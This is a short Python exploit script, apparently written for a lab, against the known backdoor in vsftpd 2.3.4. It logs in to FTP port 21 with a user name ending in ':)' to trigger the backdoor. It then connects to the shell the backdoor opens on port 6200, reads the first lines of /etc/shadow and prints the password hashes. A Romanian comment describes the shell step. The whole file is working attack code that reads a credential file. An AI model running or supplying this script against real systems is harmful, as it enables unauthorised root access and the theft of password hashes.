import socket
from time import sleep
 
def open_backdoor():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    client.connect((rhost,rport)) 
    conn_ret=client.recv(1024)
    client.sendall(("USER " + "anything" + ":)\r\n").encode('utf-8')) #Login with FTP creds which trigger backdoor
    user_ret=client.recv(1024).decode('utf-8')
    if user_ret.startswith('530'):
        print("This server is configured for anonymous only and the backdoor code cannot be reached")
        client.close()
        exit(1)
    if not user_ret.startswith('331'):
        print("This server did not respond as expected: "+user_ret)
        exit(1)
    client.sendall(("PASS \r\n").encode('utf-8')) # USER PASS are FTP specific commands
    return True
    
def handle_backdoor():
    back_sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    back_sock.connect((rhost,6200)) # now we netcat (open a connection) to the opened port to /bin/sh on machine
    back_sock.sendall(b'cat /etc/shadow | head\n')
    ret=back_sock.recv(4096).decode('utf-8')
    print(ret)
    back_sock.close()

def exploit():
    open_backdoor()
    #odata introdus userul cu :) se dechide un reverse shell pe portul 6200 pe care vom putea sa l accesam prin backdoor si sa dam comenzi
    sleep(2)
    handle_backdoor()

rhost = "192.168.144.131"       
rport = int('21')           


exploit()
